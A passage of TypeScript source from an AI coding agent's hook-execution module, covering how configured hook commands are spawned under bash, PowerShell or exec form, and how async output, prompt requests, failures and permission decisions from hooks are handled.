        { level: 'verbose' },
      )
    } catch (sandboxError) {
      // If sandbox wrapping fails, log and continue without sandbox.
      // This preserves backwards compatibility — hooks that ran before
      // sandbox support was added will still work.
      logForDebugging(
        `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
        { level: 'warn' },
      )
    }
  }

  if (
    isExecForm &&
    typeof command === 'string' &&
    /\s/.test(command) &&
    !/[\\/]/.test(command)
  ) {
    logForDebugging(
      `Hook command "${hook.command}" has both "args" and whitespace in "command". ` +
        `Exec form treats "command" as a single executable name; move the rest into "args". ` +
        `Example: { "command": "node", "args": ["script.js"] }.`,
      { level: 'warn' },
    )
  }

  let child: ChildProcessWithoutNullStreams
  if (isExecForm) {
    child = spawn(command, execArgs ?? [], {
      env: envVars,
      cwd: safeCwd,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else if (shellType === 'powershell') {
    const pwshPath = await getCachedPowerShellPath()
    if (!pwshPath) {
      throw new Error(
        `Hook "${hook.command}" has shell: 'powershell' but no PowerShell ` +
          `executable (pwsh or powershell) was found on PATH. Install ` +
          `PowerShell, or remove "shell": "powershell" to use bash.`,
      )
    }
    const psCommand = wrapPowerShellHookWithNoBashAstGuard(
      finalCommand,
      hook,
      hookEvent,
    )
    child = spawn(pwshPath, buildPowerShellArgs(psCommand), {
      env: envVars,
      cwd: safeCwd,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else {
    // On Windows, use Git Bash explicitly (cmd.exe can't run bash syntax).
    // On other platforms, shell: true uses /bin/sh.
    let shell: string | boolean = true
    if (isWindows) {
      const gitBashPath = findGitBashPathOrNull()
      if (!gitBashPath) {
        throw new Error(
          `Hook "${hook.command}" requires bash but Git Bash was not found. Install Git for Windows or set CLAUDE_CODE_GIT_BASH_PATH, or set "shell": "powershell" on the hook.`,
        )
      }
      shell = gitBashPath
    }
    child = spawn(sandboxedCommand, [], {
      env: envVars,
      cwd: safeCwd,
      shell,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  }

  // Hooks use pipe mode — stdout must be streamed into JS so we can parse
  // the first response line to detect async hooks ({"async": true}).
  const hookTaskOutput = new TaskOutput(`hook_${child.pid}`, null)
  const shellCommand = wrapSpawn(child, signal, hookTimeoutMs, hookTaskOutput)
  // Track whether shellCommand ownership was transferred (e.g., to async hook registry)
  let shellCommandTransferred = false
  // Track whether stdin has already been written (to avoid "write after end" errors)
  let stdinWritten = false

  if ((hook.async || hook.asyncRewake) && !forceSyncExecution) {
    const processId = `async_hook_${child.pid}`
    logForDebugging(
      `Hooks: Config-based async hook, backgrounding process ${processId}`,
    )

    // Write stdin before backgrounding so the hook receives its input.
    // The trailing newline matches the sync path (L1000). Without it,
    // bash `read -r line` returns exit 1 (EOF before delimiter) — the
    // variable IS populated but `if read -r line; then ...` skips the
    // branch. See gh-30509 / CC-161.
    child.stdin.write(jsonInput + '\n', 'utf8')
    child.stdin.end()
    stdinWritten = true

    const backgrounded = executeInBackground({
      processId,
      hookId,
      shellCommand,
      asyncResponse: { async: true, asyncTimeout: hookTimeoutMs },
      hookEvent,
      hookName,
      command: hook.command,
      asyncRewake: hook.asyncRewake,
      rewakeMessage: hook.rewakeMessage,
      rewakeSummary: hook.rewakeSummary,
      scriptPaths: isExecForm
        ? [command, ...(execArgs ?? [])]
        : extractCommandScriptPaths(finalCommand),
      pluginId,
    })
    if (backgrounded) {
      return {
        stdout: '',
        stderr: '',
        output: '',
        status: 0,
        backgrounded: true,
      }
    }
  }

  let stdout = ''
  let stderr = ''
  let output = ''
  let lastDataAt = 0

  // Set up output data collection with explicit UTF-8 encoding
  child.stdout.setEncoding('utf8')
  child.stderr.setEncoding('utf8')

  let initialResponseChecked = false

  let asyncResolve:
    | ((result: {
        stdout: string
        stderr: string
        output: string
        status: number
      }) => void)
    | null = null
  const childIsAsyncPromise = new Promise<HookCommandResult>(resolve => {
    asyncResolve = resolve
  })

  // Track trimmed prompt-request lines we processed so we can strip them
  // from final stdout by content match (no index tracking → no index drift)
  const processedPromptLines = new Set<string>()
  // Serialize async prompt handling so responses are sent in order
  let promptChain = Promise.resolve()
  // Line buffer for detecting prompt requests in streaming output
  let lineBuffer = ''

  const collectStdout = (data: string) => {
    lastDataAt = Date.now()
    stdout += data
    output += data

    // When requestPrompt is provided, parse stdout line-by-line for prompt requests
    if (requestPrompt) {
      lineBuffer += data
      const lines = lineBuffer.split('\n')
      lineBuffer = lines.pop() ?? '' // last element is an incomplete line

      for (const line of lines) {
        const trimmed = line.trim()
        if (!trimmed) continue

        try {
          const parsed = jsonParse(trimmed)
          const validation = promptRequestSchema().safeParse(parsed)
          if (validation.success) {
            processedPromptLines.add(trimmed)
            logForDebugging(
              `Hooks: Detected prompt request from hook: ${trimmed}`,
            )
            // Chain the async handling to serialize prompt responses
            const promptReq = validation.data
            const reqPrompt = requestPrompt
            promptChain = promptChain.then(async () => {
              try {
                const response = await reqPrompt(promptReq)
                child.stdin.write(jsonStringify(response) + '\n', 'utf8')
              } catch (err) {
                logForDebugging(`Hooks: Prompt request handling failed: ${err}`)
                // User cancelled or prompt failed — close stdin so the hook
                // process doesn't hang waiting for input
                child.stdin.destroy()
              }
            })
          }
        } catch {
          // Not JSON, just a normal line
        }
      }
    }

    // Check for async response on first line of output. The async protocol is:
    // hook emits {"async":true,...} as its FIRST line, then its normal output.
    // We must parse ONLY the first line — if the process is fast and writes more
    // before this 'data' event fires, parsing the full accumulated stdout fails
    // and an async hook blocks for its full duration instead of backgrounding.
    if (!initialResponseChecked) {
      const firstLine = firstLineOf(stdout).trim()
      if (!firstLine.includes('}')) return
      initialResponseChecked = true
      logForDebugging(`Hooks: Checking first line for async: ${firstLine}`)
      try {
        const parsed = jsonParse(firstLine)
        logForDebugging(
          `Hooks: Parsed initial response: ${jsonStringify(parsed)}`,
        )
        if (isAsyncHookJSONOutput(parsed) && !forceSyncExecution) {
          const processId = `async_hook_${child.pid}`
          logForDebugging(
            `Hooks: Detected async hook, backgrounding process ${processId}`,
          )

          const backgrounded = executeInBackground({
            processId,
            hookId,
            shellCommand,
            asyncResponse: parsed,
            hookEvent,
            hookName,
            command: hook.command,
            pluginId,
          })
          if (backgrounded) {
            shellCommandTransferred = true
            asyncResolve?.({
              stdout,
              stderr,
              output,
              status: 0,
            })
          }
        } else if (isAsyncHookJSONOutput(parsed) && forceSyncExecution) {
          logForDebugging(
            `Hooks: Detected async hook but forceSyncExecution is true, waiting for completion`,
          )
        } else {
          logForDebugging(
            `Hooks: Initial response is not async, continuing normal processing`,
          )
        }
      } catch (e) {
        logForDebugging(`Hooks: Failed to parse initial response as JSON: ${e}`)
      }
    }
  }
  const collectStderr = (data: string) => {
    lastDataAt = Date.now()
    stderr += data
    output += data
  }
  child.stdout.on('data', collectStdout)
  child.stderr.on('data', collectStderr)

  const stopProgressInterval = startHookProgressInterval({
    hookId,
    hookName,
    hookEvent,
    getOutput: async () => ({ stdout, stderr, output }),
  })

  let stdoutEnded = false
  let stderrEnded = false
  let stdioClosedWithoutEnd = false
  const stdoutEndPromise = new Promise<void>(resolve => {
    child.stdout.once('end', () => {
      stdoutEnded = true
      resolve()
    })
    child.stdout.once('close', () => {
      if (!stdoutEnded) stdioClosedWithoutEnd = true
      resolve()
    })
  })
  const stderrEndPromise = new Promise<void>(resolve => {
    child.stderr.once('end', () => {
      stderrEnded = true
      resolve()
    })
    child.stderr.once('close', () => {
      if (!stderrEnded) stdioClosedWithoutEnd = true
      resolve()
    })
  })

  // Write to stdin, making sure to handle EPIPE errors that can happen when
  // the hook command exits before reading all input.
  // Note: EPIPE handling is difficult to set up in testing since Bun and Node
  // have different behaviors.
  // TODO: Add tests for EPIPE handling.
  // Skip if stdin was already written (e.g., by config-based async hook path)
  const stdinWritePromise = stdinWritten
    ? Promise.resolve()
    : new Promise<void>((resolve, reject) => {
        child.stdin.on('error', err => {
          // When requestPrompt is provided, stdin stays open for prompt responses.
          // EPIPE errors from later writes (after process exits) are expected -- suppress them.
          if (!requestPrompt) {
            reject(err)
          } else {
            logForDebugging(
              `Hooks: stdin error during prompt flow (likely process exited): ${err}`,
            )
          }
        })
        // Explicitly specify UTF-8 encoding to ensure proper handling of Unicode characters
        child.stdin.write(jsonInput + '\n', 'utf8')
        // When requestPrompt is provided, keep stdin open for prompt responses
        if (!requestPrompt) {
          child.stdin.end()
        }
        resolve()
      })

  // Create promise for child process error
  const childErrorPromise = new Promise<never>((_, reject) => {
    child.on('error', reject)
  })

  // Create promise for child process close - but only resolve after streams end
  // to ensure all output has been collected
  const childClosePromise = new Promise<HookCommandResult>(resolve => {
    child.on('exit', code => {
      const aborted = signal.aborted
      void waitForHookStreams(
        Promise.all([stdoutEndPromise, stderrEndPromise]),
        () => lastDataAt,
      ).then(() => {
        child.stdout.removeListener('data', collectStdout)
        child.stderr.removeListener('data', collectStderr)
        // Strip lines we processed as prompt requests so parseHookOutput
        // only sees the final hook result. Content-matching against the set
        // of actually-processed lines means prompt JSON can never leak
        // through (fail-closed), regardless of line positioning.
        const finalStdout =
          processedPromptLines.size === 0
            ? stdout
            : stdout
                .split('\n')
                .filter(line => !processedPromptLines.has(line.trim()))
                .join('\n')

        resolve({
          stdout: finalStdout,
          stderr,
          output,
          status: code ?? 1,
          aborted,
          ...(code !== null && { exitedNormally: true }),
          ...(!(stdoutEnded && stderrEnded) && { stdioIncomplete: true }),
          ...(stdioClosedWithoutEnd && { stdioClosedWithoutEnd: true }),
        })
      })
    })
  })

  // Race between stdin write, async detection, and process completion
  try {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_started', {
        hook_event_name: hookEvent,
        index: hookIndex,
      })
    }
    await Promise.race([stdinWritePromise, childErrorPromise])

    // Wait for any pending prompt responses before resolving
    const result = await Promise.race([
      childIsAsyncPromise,
      childClosePromise,
      childErrorPromise,
    ])
    // Ensure all queued prompt responses have been sent
    await promptChain
    diagExitCode = result.status
    diagAborted = result.aborted ?? false
    return result
  } catch (error) {
    // Handle errors from stdin write or child process
    const code = getErrnoCode(error)
    diagExitCode = 1

    if (code === 'EPIPE') {
      logForDebugging(
        'EPIPE error while writing to hook stdin (hook command likely closed early)',
      )
      const errMsg =
        'Hook command closed stdin before hook input was fully written (EPIPE)'
      return {
        stdout: '',
        stderr: errMsg,
        output: errMsg,
        status: 1,
      }
    } else if (code === 'ABORT_ERR') {
      diagAborted = true
      return {
        stdout: '',
        stderr: 'Hook cancelled',
        output: 'Hook cancelled',
        status: 1,
        aborted: true,
      }
    } else {
      // densable 2.1.246 kwe: spawn-fail uses the resolved argv (plugin
      // vars already substituted above), so Y(err) shows the real path
      // instead of a literal ${CLAUDE_PLUGIN_ROOT}.
      const errorMsg = errorMessage(error)
      logForDebugging(
        `Hook command failed to spawn (${hookName}): ${errorMsg}`,
        { level: 'error' },
      )
      const errOutput = `Error occurred while executing hook command: ${errorMsg}`
      return {
        stdout: '',
        stderr: errOutput,
        output: errOutput,
        status: 1,
        spawnFailed: true,
      }
    }
  } finally {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_completed', {
        hook_event_name: hookEvent,
        index: hookIndex,
        duration_ms: Date.now() - diagStartMs,
        exit_code: diagExitCode,
        aborted: diagAborted,
      })
    }
    stopProgressInterval()
    // Clean up stream resources unless ownership was transferred (e.g., to async hook registry)
    if (!shellCommandTransferred) {
      shellCommand.cleanup()
    }
    // Clean up sandbox artifacts (e.g. bwrap mount-point files on Linux)
    if (sandboxedCommand !== finalCommand) {
      SandboxManager.cleanupAfterCommand()
    }
  }
}

/**
 * Official 2.1.191+/2.1.207 exact-list charset for tool-name hook matchers.
 * Allows pipe/comma/space lists and hyphens (MCP tool names often contain `-`).
 * When the matcher only uses this charset it is treated as an exact list, not regex.
 */

export {
  Eve,
  Swt,
  Uct,
  computeSessionEndHooksBoundMs,
  executeInBackground,
  extractCommandScriptPaths,
  getPreToolHookBlockingMessage,
  getSessionEndHookTimeoutMs,
  getSessionEndHooksBoundMs,
  getStopHookMessage,
  getTaskCompletedHookMessage,
  getTaskCreatedHookMessage,
  getTeammateIdleHookMessage,
  getUserPromptExpansionHookBlockingMessage,
  getUserPromptSubmitHookBlockingMessage,
  isOfficialHookPluginId,
  resetBrokenAsyncRewakeForTests,
  shouldDowngradeMissingHookScriptExit2,
  shouldFailClosedHookInput,
  shouldSkipHookDueToTrust,
  wwt,
}
export type {
  AggregatedHookResult,
  ElicitationResponse,
  HookBlockingError,
  HookOutsideReplResult,
  HookResult,
}

function classicResultFields(key: string, event: HookEvent): string[] {
  switch (key) {
    case 'block':
      return event === 'PreModelSwitch'
        ? ['blockingError']
        : [
            'blockingError',
            'permissionBehavior',
            'hookPermissionDecisionReason',
          ]
    case 'additionalContext':
      return ['additionalContexts']
    case 'permissionDecision':
    case 'permissionDecisionReason':
      return ['permissionBehavior', 'hookPermissionDecisionReason']
    case 'decision':
      return ['permissionRequestResult', 'permissionBehavior', 'updatedInput']
    case 'delta':
      return ['displayContent']
    case 'additionalContexts':
    case 'permissionBehavior':
    case 'hookPermissionDecisionReason':
    case 'permissionRequestResult':
    case 'updatedInput':
    case 'preventContinuation':
    case 'stopReason':
    case 'sessionTitle':
    case 'suppressOriginalPrompt':
    case 'initialUserMessage':
    case 'watchPaths':
    case 'reloadSkills':
    case 'updatedToolOutput':
    case 'updatedMCPToolOutput':
    case 'retry':
    case 'displayContent':
      return [key]
    default:
      return []
  }
}

function projectClassicHookResults(
  results: AggregatedHookResult[],
): Record<string, unknown> {
  const projected: Record<string, unknown> = {}
  const ranks: Record<string, number> = { allow: 1, ask: 2, deny: 3 }
  for (const result of results) {
    if (result.blockingError)
      projected.block = result.blockingError.blockingError
    if (result.additionalContexts?.length) {
      projected.additionalContext = [
        ...((projected.additionalContext as string[] | undefined) ?? []),
        ...result.additionalContexts,
      ]
    }
    if (result.watchPaths?.length) {
      projected.watchPaths = [
        ...((projected.watchPaths as string[] | undefined) ?? []),
        ...result.watchPaths,
      ]
    }
    if (result.permissionBehavior && ranks[result.permissionBehavior]) {
      const previous = projected.permissionDecision as string | undefined
      if (
        (ranks[result.permissionBehavior] ?? 0) >= (ranks[previous ?? ''] ?? 0)
      ) {
        projected.permissionDecision = result.permissionBehavior
        projected.permissionDecisionReason = result.hookPermissionDecisionReason
      }
    }
    if (result.permissionRequestResult && projected.decision === undefined) {
      projected.decision = result.permissionRequestResult
    }
    for (const key of [
      'preventContinuation',
      'stopReason',
      'initialUserMessage',
      'sessionTitle',
      'suppressOriginalPrompt',
      'reloadSkills',
      'updatedToolOutput',
      'updatedMCPToolOutput',
      'retry',
      'displayContent',
    ] as const) {
      if (result[key] !== undefined) projected[key] = result[key]
    }
  }
  return projected
}

/** Typed representation of sync hook JSON output, matching the syncHookResponseSchema Zod schema. */
interface TypedSyncHookOutput {
  continue?: boolean
  suppressOutput?: boolean
  stopReason?: string
  decision?: 'approve' | 'block'
  reason?: string
  systemMessage?: string
  terminalSequence?: string
  hookSpecificOutput?:
    | {
        hookEventName: 'PreToolUse'
        permissionDecision?: 'ask' | 'deny' | 'allow' | 'passthrough' | 'defer'
        permissionDecisionReason?: string
        updatedInput?: Record<string, unknown>
        additionalContext?: string
      }
    | {
        hookEventName: 'UserPromptSubmit'
        additionalContext?: string
        sessionTitle?: string
        suppressOriginalPrompt?: boolean
      }
    | {
        hookEventName: 'UserPromptExpansion'
        additionalContext?: string
        suppressOriginalPrompt?: boolean
      }
    | {
        hookEventName: 'SessionStart'
        additionalContext?: string
        initialUserMessage?: string
        sessionTitle?: string
        watchPaths?: string[]
        reloadSkills?: boolean
      }
    | {
        hookEventName: 'Setup'
        additionalContext?: string
      }
    | {
        hookEventName: 'PreModelSwitch'
        permissionDecision?: 'allow' | 'deny' | 'ask'
        permissionDecisionReason?: string
      }
    | {
        hookEventName: 'PostModelSwitch'
        additionalContext?: string
      }
    | {
        hookEventName: 'SubagentStart'
        additionalContext?: string
      }
    | {
        hookEventName: 'PostToolUse'
        additionalContext?: string
        updatedToolOutput?: unknown
        classifierContext?: string
        updatedMCPToolOutput?: unknown
      }
    | {
        hookEventName: 'PostToolUseFailure'
        additionalContext?: string
      }
    | {
        hookEventName: 'PostToolBatch'
        additionalContext?: string
      }
    | {
        hookEventName: 'Stop'
        additionalContext?: string
      }
    | {
        hookEventName: 'SubagentStop'
        additionalContext?: string
      }
    | {
        hookEventName: 'PermissionDenied'
        retry?: boolean
      }
    | {
        hookEventName: 'Notification'
        additionalContext?: string
      }
    | {
        hookEventName: 'PermissionRequest'
        decision?: PermissionRequestResult
      }
    | {
        hookEventName: 'Elicitation'
        action?: 'accept' | 'decline' | 'cancel'
        content?: Record<string, unknown>
      }
    | {
        hookEventName: 'ElicitationResult'
        action?: 'accept' | 'decline' | 'cancel'
        content?: Record<string, unknown>
      }
    | {
        hookEventName: 'CwdChanged'
        watchPaths?: string[]
      }
    | {
        hookEventName: 'FileChanged'
        watchPaths?: string[]
      }
    | {
        hookEventName: 'WorktreeCreate'
        worktreePath: string
      }
    | {
        hookEventName: 'MessageDisplay'
        displayContent?: string
      }
}

/**
 * Gold `bO` / `XBt` — escape `<system-reminder>` and `</system-reminder>`
 * (plus trailing `<` / `</`) in hook outputs before they reach Claude (#255).
 */
export function escapeSystemReminderTags(text: string): string {
  return text
    .replaceAll(/<(?=\s*(?:\/\s*)?system-reminder\b)/gi, '&lt;')
    .replace(/<(?=\s*(?:\/\s*)?$)/, '&lt;')
}

/**
 * Gold `jse` — hook events where `onFailure: "block"` is ignored because
 * blocking those events on hook failure would trap the session/task (#343).
 */
export const ON_FAILURE_BLOCK_IGNORED_EVENTS: ReadonlySet<HookEvent> =
  new Set<HookEvent>(['Stop', 'SubagentStop', 'TaskCompleted', 'TeammateIdle'])

type HookWithOnFailure = {
  type: string
  async?: boolean
  asyncRewake?: boolean
  onFailure?: 'continue' | 'block'
}

/**
 * Gold `HG` — returns true when the hook is configured with `onFailure: "block"`
 * (excluding async/asyncRewake command hooks and non-command/http/callback hooks).
 */
export function isOnFailureBlock(hook: HookWithOnFailure): boolean {
  switch (hook.type) {
    case 'command':
      return (
        hook.onFailure === 'block' &&
        hook.async !== true &&
        hook.asyncRewake !== true
      )
    case 'http':
    case 'callback':
      return hook.onFailure === 'block'
    default:
      return false
  }
}

/**
 * Gold `YQe` — true when `onFailure: "block"` applies to this hook + event.
 */
const PS_NAMED_BLOCKS = 'begin|process|end|clean|dynamicparam'
const PS_NAMED_BLOCK_START_RE = new RegExp(`^(${PS_NAMED_BLOCKS})\\s*\\{`, 'i')
const PS_NAMED_BLOCK_ANY_RE = new RegExp(
  `(?:^|[^-$.\\w])(?:${PS_NAMED_BLOCKS})(?=[\\s\\u0085]*(?:\\{|#|<#|\`))`,
  'i',
)

/** Official `FCe` + `cen`: detect PowerShell script headers where trailing `; if (-not $?) ...` is invalid. */
function isPowerShellScriptHeader(command: string): boolean {
  let i = 0
  for (;;) {
    while (i < command.length && /[\s;]/.test(command[i]!)) i++
    if (command[i] === '#') {
      while (i < command.length && command[i] !== '\n') i++
      continue
    }
    if (command.startsWith('<#', i)) {
      const close = command.indexOf('#>', i + 2)
      i = close === -1 ? command.length : close + 2
      continue
    }
    break
  }
  const rest = command.slice(i)
  const startsHeader =
    /^using\s+(namespace|module|assembly)\b/i.test(rest) ||
    /^param\s*\(/i.test(rest) ||
    PS_NAMED_BLOCK_START_RE.test(rest) ||
    (/^\[\w/.test(rest) && !/^\[[\w.]+\]::/.test(rest))
  return startsHeader && PS_NAMED_BLOCK_ANY_RE.test(command)
}

/**
 * #1149: propagate native program exit code 2 from PowerShell hooks
 * (PowerShell otherwise swallows `$LASTEXITCODE` on non-PermissionRequest hooks).
 */
export function wrapPowerShellHookCommand(
  command: string,
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
): string {
  if (hookEvent === 'PermissionRequest' || isPowerShellScriptHeader(command)) {
    return command
  }
  return `${command}\n; if (-not $?) { if ($LASTEXITCODE -eq 2) { exit 2 } }`
}

const NO_BASH_ONLY_STRINGS_EXIT_CODE = 127

export function wrapPowerShellHookWithNoBashAstGuard(
  command: string,
  hook: HookWithOnFailure & {
    type?: string
    shell?: string
    args?: unknown
    async?: boolean
    asyncRewake?: boolean
  },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  isWindows = getPlatform() === 'windows',
  hasGitBash = isWindows ? findGitBashPathOrNull() !== null : true,
): string {
  const base = wrapPowerShellHookCommand(command, hookEvent)
  if (
    isPowerShellScriptHeader(command) ||
    hook.shell !== undefined ||
    hookEvent === 'StatusLine' ||
    hookEvent === 'FileSuggestion' ||
    !shouldBlockNoBashGuard(hook, hookEvent, isWindows, hasGitBash)
  ) {
    return base
  }
  return (
    base +
    `\n; if (-not $?) { exit 1 }\n` +
    `; $claudeNoVerdict = $false\n` +
    `; try { $claudeSeen = $false; $claudeOnlyStrings = $true; foreach ($claudeStatement in $MyInvocation.MyCommand.ScriptBlock.Ast.EndBlock.Statements) { if ($claudeStatement.Extent.StartOffset -lt ${command.length}) { $claudeSeen = $true; $claudeElements = 0; foreach ($claudeElement in $claudeStatement.PipelineElements) { $claudeElements++; if ($claudeElement.PSTypeNames -notcontains 'System.Management.Automation.Language.CommandExpressionAst') { $claudeOnlyStrings = $false } elseif ($claudeElement.Expression.PSTypeNames -contains 'System.Management.Automation.Language.ExpandableStringExpressionAst') { foreach ($claudeNested in $claudeElement.Expression.NestedExpressions) { if ($claudeNested.PSTypeNames -contains 'System.Management.Automation.Language.SubExpressionAst') { $claudeOnlyStrings = $false } } } elseif ($claudeElement.Expression.PSTypeNames -notcontains 'System.Management.Automation.Language.StringConstantExpressionAst') { $claudeOnlyStrings = $false } }; if ($claudeElements -ne 1) { $claudeOnlyStrings = $false } } }; $claudeNoVerdict = $claudeSeen -and $claudeOnlyStrings } catch { }\n` +
    `; if ($claudeNoVerdict) { exit ${NO_BASH_ONLY_STRINGS_EXIT_CODE} }\n` +
    `; $claudeNoVerdict = $false`
  )
}

/**
 * Official rRe(e, n) (#698, #1149): on Windows without Git for Windows, a PreToolUse
 * or PermissionRequest command hook (even with `shell: "powershell"`) that sets
 * no `args` and no `onFailure: "continue"` acts as a guard — if it fails, block
 * the call instead of failing open.
 */
export function shouldBlockNoBashGuard(
  hook: HookWithOnFailure & {
    type?: string
    shell?: string
    args?: unknown
    async?: boolean
    asyncRewake?: boolean
  },
  hookEvent: HookEvent,
  isWindows = getPlatform() === 'windows',
  hasGitBash = isWindows ? findGitBashPathOrNull() !== null : true,
): boolean {
  return (
    hook.type === 'command' &&
    hook.async !== true &&
    hook.asyncRewake !== true &&
    hook.args === undefined &&
    hook.onFailure !== 'continue' &&
    isWindows &&
    !hasGitBash &&
    (hookEvent === 'PreToolUse' || hookEvent === 'PermissionRequest')
  )
}

export function shouldBlockOnFailureForEvent(
  hook: HookWithOnFailure,
  hookEvent: HookEvent,
): boolean {
  return (
    (isOnFailureBlock(hook) &&
      !ON_FAILURE_BLOCK_IGNORED_EVENTS.has(hookEvent)) ||
    shouldBlockNoBashGuard(hook, hookEvent)
  )
}

/**
 * Gold `$in` — convert a failed or timed-out hook result into a blocking
 * result when `onFailure: "block"` is active for the hook and event (#343),
 * or when a Windows PreToolUse/PermissionRequest guard fails without Git Bash (#698).
 */
export function applyOnFailureBlockToHookResult(
  result: HookResult,
  hookEvent: HookEvent,
  signal?: AbortSignal,
  isWindows = getPlatform() === 'windows',
  hasGitBash = isWindows ? findGitBashPathOrNull() !== null : true,
): HookResult {
  const hook = result.hook as HookResult['hook'] & HookWithOnFailure
  const blockReason = isOnFailureBlock(hook)
    ? 'setting'
    : shouldBlockNoBashGuard(hook, hookEvent, isWindows, hasGitBash)
      ? 'noBash'
      : undefined
  if (blockReason === undefined) return result

  const stoppedAfterItsTimeout =
    (result as HookResult & { stoppedAfterItsTimeout?: boolean })
      .stoppedAfterItsTimeout === true
  const failureKind =
    result.outcome === 'cancelled' &&
    hook.type !== 'callback' &&
    (signal?.aborted !== true || stoppedAfterItsTimeout)
      ? 'timed out'
      : result.outcome === 'non_blocking_error'
        ? 'failed'
        : undefined
  if (failureKind === undefined) return result

  if (ON_FAILURE_BLOCK_IGNORED_EVENTS.has(hookEvent)) {
    logForDebugging(
      `Hooks: ${hookEvent} ${hook.type} hook ${failureKind}; not blocking (onFailure: "block" is ignored on ${hookEvent})`,
      { level: 'warn' },
    )
    return result
  }

  const command = getHookDisplayText(hook)
  const att =
    result.message &&
    typeof result.message === 'object' &&
    'type' in result.message &&
    result.message.type === 'attachment' &&
    'attachment' in result.message
      ? (result.message.attachment as {
          type?: string
          stderr?: string
          exitCode?: number
        })
      : undefined
  const detail =
    att?.type === 'hook_non_blocking_error' && typeof att.stderr === 'string'
      ? att.stderr.trim()
      : ''
  const sanitizedDetail = escapeSystemReminderTags(detail)
  const onlyStringsNoBash =
    !ON_FAILURE_BLOCK_IGNORED_EVENTS.has(hookEvent) &&
    att?.type === 'hook_non_blocking_error' &&
    att.exitCode === NO_BASH_ONLY_STRINGS_EXIT_CODE &&
    hook.type === 'command' &&
    (hook as { shell?: string }).shell === undefined &&
    shouldBlockNoBashGuard(hook, hookEvent, isWindows, hasGitBash)
  const reasonPhrase = onlyStringsNoBash
    ? `blocking because Git Bash wasn't found, so only exit code 0 or 2 counts as this hook's verdict. The hook ended with exit code 127. If its command is only quoted strings, PowerShell started no program. To run a program, install Git for Windows (https://git-scm.com/downloads/win) and start a new session, or put the program in "command" and its arguments in "args" ("args": [] if it has none) and set "onFailure" to "block" so that failures still block. To print this text, such as a JSON answer, set "shell" to "powershell". The user needs to do this; Claude should not change the hook.`
    : blockReason === 'noBash'
      ? hook.type === 'command' &&
        (hook as { shell?: string }).shell === 'powershell'
        ? 'blocking because Git Bash wasn\'t found, so only exit code 0 or 2 counts as this hook\'s verdict. Make the hook end with exit code 0 or 2, or set "onFailure" to "continue" to let its failures pass.'
        : "blocking because Git Bash wasn't found"
      : 'blocking because onFailure is "block"'
  const blockingText = `[${command}]: ${failureKind}; ${reasonPhrase}${sanitizedDetail === '' ? '' : `\n${sanitizedDetail}`}`

  logForDebugging(
    `Hooks: ${hookEvent} ${hook.type} hook ${failureKind}; ${reasonPhrase}`,
    { level: 'warn' },
  )

  return {
    ...result,
    message: undefined,
    blockingError: {
      blockingError: blockingText,
      command,
    },
    ...(hookEvent === 'PermissionRequest' && {
      permissionRequestResult: {
        behavior: 'deny' as const,
        message: blockingText,
      },
    }),
    suppressOriginalPrompt: true,
    outcome: 'blocking',
  }
}

/**
 * Gold `Hin` — convert an unsuccessful, non-cancelled outside-REPL hook result
 * into a blocked result when `onFailure: "block"` is set (#343).
 */
export function applyOnFailureBlockToAggregatedHookResult(
  hook: HookWithOnFailure,
  aggregated: HookOutsideReplResult,
  hookEvent?: HookEvent,
): HookOutsideReplResult {
  if (
    (hookEvent !== undefined &&
      ON_FAILURE_BLOCK_IGNORED_EVENTS.has(hookEvent)) ||
    !isOnFailureBlock(hook) ||
    aggregated.succeeded ||
    aggregated.blocked ||
    aggregated.cancelled === true
  ) {
    return aggregated
  }
  const timedOut = aggregated.output === 'Hook cancelled'
  const detail = timedOut ? '' : aggregated.output.trim()
  return {
    ...aggregated,
    blocked: true,
    output: `${timedOut ? 'timed out' : 'failed'}; blocking because onFailure is "block"${detail === '' ? '' : `\n${detail}`}`,
  }
}

export function processHookJSONOutput({
  json: rawJson,
  command,
  hookName,
  toolUseID,
  hookEvent,
  expectedHookEvent,
  stdout,
  stderr,
  exitCode,
  durationMs,
}: {
  json: SyncHookJSONOutput
  command: string
  hookName: string
  toolUseID: string
  hookEvent: HookEvent
  expectedHookEvent?: HookEvent
  stdout?: string
  stderr?: string
  exitCode?: number
  durationMs?: number
}): Partial<HookResult> {
  const result: Partial<HookResult> = {}

  // Cast to typed interface for type-safe property access
  const json = rawJson as TypedSyncHookOutput

  // At this point we know it's a sync response
  const syncJson = json

  // Handle common elements
  if (syncJson.continue === false) {
    result.preventContinuation = true
    if (syncJson.stopReason) {
      result.stopReason = syncJson.stopReason
    }
  }

  if (json.decision) {
    switch (json.decision) {
      case 'approve':
        result.permissionBehavior = 'allow'
        break
      case 'block':
        result.permissionBehavior = 'deny'
        result.blockingError = {
          blockingError: json.reason || 'Blocked by hook',
          command,
        }
        break
      default:
        // Handle unknown decision types as errors
        throw new Error(
          `Unknown hook decision type: ${json.decision}. Valid types are: approve, block`,
        )
    }
  }

  // Handle systemMessage field
  if (json.systemMessage) {
    result.systemMessage = json.systemMessage
  }

  if (json.terminalSequence) {
    const allowed = parseAllowedTerminalSequence(json.terminalSequence)
    if (allowed !== null) {
      result.terminalSequence = allowed
    } else {
      logForDebugging(rejectedTerminalSequenceMessage(hookName, hookEvent))
    }
  }

  // Handle PreToolUse specific
  if (
    json.hookSpecificOutput?.hookEventName === 'PreToolUse' &&
    json.hookSpecificOutput.permissionDecision
  ) {
    switch (json.hookSpecificOutput.permissionDecision) {
      case 'allow':
        result.permissionBehavior = 'allow'
        break
      case 'deny':
        result.permissionBehavior = 'deny'
        result.blockingError = {
          blockingError: json.reason || 'Blocked by hook',
          command,
        }
        break
      case 'ask':
        result.permissionBehavior = 'ask'
        break
      case 'defer':
        result.permissionBehavior = 'defer'
        break
      default:
        // Handle unknown decision types as errors
        throw new Error(
          `Unknown hook permissionDecision type: ${json.hookSpecificOutput.permissionDecision}. Valid types are: allow, deny, ask, defer`,
        )
    }
  }
  if (result.permissionBehavior !== undefined && json.reason !== undefined) {
